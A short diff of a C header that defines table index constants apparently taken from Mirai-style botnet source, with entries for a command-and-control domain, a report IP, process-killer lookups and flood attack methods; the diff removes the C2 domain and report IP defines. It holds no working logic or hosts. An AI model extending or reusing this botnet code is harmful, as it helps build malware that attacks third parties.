@@ -13,13 +13,11 @@ struct table_value {
 
 #define TABLE_KEY_LEN (sizeof(table_keys) / sizeof(*table_keys))
 
-#define TABLE_CNC_DOMAIN        0
 #define TABLE_EXEC_SUCCESS      1
 #define TABLE_ATK_VSE           3
 #define TABLE_KILLER_PROC       4
 #define TABLE_KILLER_EXE        5
 #define TABLE_KILLER_FD         6
-#define TABLE_REPORT_IP         18
 #define TABLE_ATK_RAKNET        19  
 #define TABLE_MAX_KEYS          20   
 
